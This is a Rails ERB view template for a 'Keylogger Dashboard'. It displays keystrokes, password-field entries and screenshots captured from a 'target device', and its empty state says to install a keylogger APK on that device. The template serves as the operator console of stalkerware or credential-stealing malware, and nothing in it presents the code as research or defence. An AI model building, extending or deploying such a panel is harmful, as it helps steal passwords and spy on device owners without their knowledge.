<div class="keylogger-dashboard">
  <style>
    .keylogger-dashboard {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #0a0a0f 0%, #12121a 100%);
      min-height: calc(100vh - 100px);
      margin: -30px;
      padding: 30px;
      color: #f8fafc;
    }
    
    .kl-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
    }
    
    .kl-title {
      font-size: 28px;
      font-weight: 700;
      background: linear-gradient(135deg, #6366f1, #8b5cf6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .kl-live {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 8px 16px;
      background: rgba(239, 68, 68, 0.2);
      border: 1px solid rgba(239, 68, 68, 0.3);
      border-radius: 20px;
      font-size: 13px;
      color: #ef4444;
      font-weight: 600;
    }
    
    .kl-live-dot {
      width: 8px;
      height: 8px;
      background: #ef4444;
      border-radius: 50%;
      animation: kl-pulse 1.5s infinite;
    }
    
    @keyframes kl-pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }
    
    .kl-stats {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 20px;
      margin-bottom: 30px;
    }
    
    .kl-stat-card {
      background: linear-gradient(145deg, #1a1a25, #12121a);
      border: 1px solid #2d2d3a;
      border-radius: 16px;
      padding: 24px;
      text-align: center;
    }
    
    .kl-stat-value {
      font-size: 36px;
      font-weight: 700;
      background: linear-gradient(135deg, #6366f1, #8b5cf6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .kl-stat-label {
      font-size: 13px;
      color: #64748b;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 8px;
    }
    
    .kl-main {
      display: grid;
      grid-template-columns: 1fr 400px;
      gap: 24px;
    }
    
    .kl-timeline {
      background: #1a1a25;
      border: 1px solid #2d2d3a;
      border-radius: 20px;
      overflow: hidden;
    }
    
    .kl-timeline-header {
      padding: 20px 24px;
      border-bottom: 1px solid #2d2d3a;
      font-size: 16px;
      font-weight: 600;
    }
    
    .kl-timeline-body {
      max-height: 600px;
      overflow-y: auto;
      padding: 16px;
    }
    
    .kl-entry {
      display: flex;
      gap: 16px;
      padding: 14px 18px;
      margin-bottom: 10px;
      background: #12121a;
      border-radius: 12px;
      border: 1px solid transparent;
      transition: all 0.2s;
    }
    
    .kl-entry:hover {
      border-color: #6366f1;
      transform: translateX(4px);
    }
    
    .kl-time {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: #64748b;
      min-width: 60px;
    }
    
    .kl-app-icon {
      width: 32px;
      height: 32px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #6366f1, #8b5cf6);
      font-size: 14px;
    }
    
    .kl-keystroke {
      flex: 1;
      font-family: 'JetBrains Mono', monospace;
      font-size: 14px;
      padding: 8px 14px;
      background: #0a0a0f;
      border-radius: 8px;
    }
    
    .kl-keystroke.password {
      background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(239, 68, 68, 0.1));
      border: 1px solid rgba(239, 68, 68, 0.3);
    }
    
    .kl-badge {
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
    }
    
    .kl-badge.text { background: rgba(99, 102, 241, 0.2); color: #6366f1; }
    .kl-badge.click { background: rgba(16, 185, 129, 0.2); color: #10b981; }
    .kl-badge.password { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
    
    .kl-screenshots {
      background: #1a1a25;
      border: 1px solid #2d2d3a;
      border-radius: 20px;
      padding: 20px;
    }
    
    .kl-screenshots-header {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 16px;
    }
    
    .kl-screenshot-grid {
      display: grid;
      gap: 16px;
      max-height: 600px;
      overflow-y: auto;
    }
    
    .kl-screenshot-card {
      background: #12121a;
      border-radius: 16px;
      overflow: hidden;
      border: 1px solid #2d2d3a;
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .kl-screenshot-card:hover {
      transform: scale(1.02);
      border-color: #6366f1;
    }
    
    .kl-screenshot-img {
      width: 100%;
      aspect-ratio: 9/16;
      object-fit: cover;
    }
    
    .kl-screenshot-meta {
      padding: 12px;
      font-size: 12px;
      color: #94a3b8;
    }
    
    .kl-empty {
      text-align: center;
      padding: 60px 20px;
      color: #64748b;
    }
    
    .kl-empty-icon {
      font-size: 48px;
      margin-bottom: 16px;
    }
  </style>

  <div class="kl-header">
    <h1 class="kl-title">🔑 Keylogger Dashboard</h1>
    <div class="kl-live">
      <div class="kl-live-dot"></div>
      LIVE MONITORING
    </div>
  </div>

  <div class="kl-stats">
    <div class="kl-stat-card">
      <div class="kl-stat-value"><%= @stats&.dig(:total_keystrokes) || 0 %></div>
      <div class="kl-stat-label">Total Keystrokes</div>
    </div>
    <div class="kl-stat-card">
      <div class="kl-stat-value"><%= @stats&.dig(:total_screenshots) || 0 %></div>
      <div class="kl-stat-label">Screenshots</div>
    </div>
    <div class="kl-stat-card">
      <div class="kl-stat-value"><%= @stats&.dig(:apps_used)&.count || 0 %></div>
      <div class="kl-stat-label">Apps Tracked</div>
    </div>
    <div class="kl-stat-card">
      <div class="kl-stat-value" style="color: #ef4444; -webkit-text-fill-color: #ef4444;"><%= @stats&.dig(:password_entries) || 0 %></div>
      <div class="kl-stat-label">🔐 Passwords</div>
    </div>
  </div>

  <div class="kl-main">
    <div class="kl-timeline">
      <div class="kl-timeline-header">
        ⌨️ Keystroke Timeline
      </div>
      <div class="kl-timeline-body">
        <% if @keylogs&.any? %>
          <% @keylogs.each do |log| %>
            <div class="kl-entry">
              <div class="kl-time"><%= Time.at(log.client_timestamp / 1000).strftime('%H:%M') rescue '--:--' %></div>
              <div class="kl-app-icon">📱</div>
              <div class="kl-keystroke <%= 'password' if log.input_type == 'password' %>">
                <%= log.keystroke %>
              </div>
              <span class="kl-badge <%= log.input_type == 'password' ? 'password' : 'text' %>">
                <%= log.event_type %>
              </span>
            </div>
          <% end %>
        <% else %>
          <div class="kl-empty">
            <div class="kl-empty-icon">⌨️</div>
            <p>No keystrokes captured yet</p>
            <p style="font-size: 12px; margin-top: 8px;">Install the Keylogger APK on target device</p>
          </div>
        <% end %>
      </div>
    </div>

    <div class="kl-screenshots">
      <div class="kl-screenshots-header">📸 Screenshots</div>
      <div class="kl-screenshot-grid">
        <% if @screenshots&.any? %>
          <% @screenshots.each do |ss| %>
            <div class="kl-screenshot-card" onclick="window.open('<%= ss.image_url %>', '_blank')">
              <img class="kl-screenshot-img" src="<%= ss.image_url %>" alt="Screenshot" loading="lazy">
              <div class="kl-screenshot-meta">
                <%= Time.at(ss.client_timestamp / 1000).strftime('%H:%M:%S') rescue '--' %> • <%= ss.trigger_type %>
              </div>
            </div>
          <% end %>
        <% else %>
          <div class="kl-empty">
            <div class="kl-empty-icon">📸</div>
            <p>No screenshots yet</p>
          </div>
        <% end %>
      </div>
    </div>
  </div>
</div>
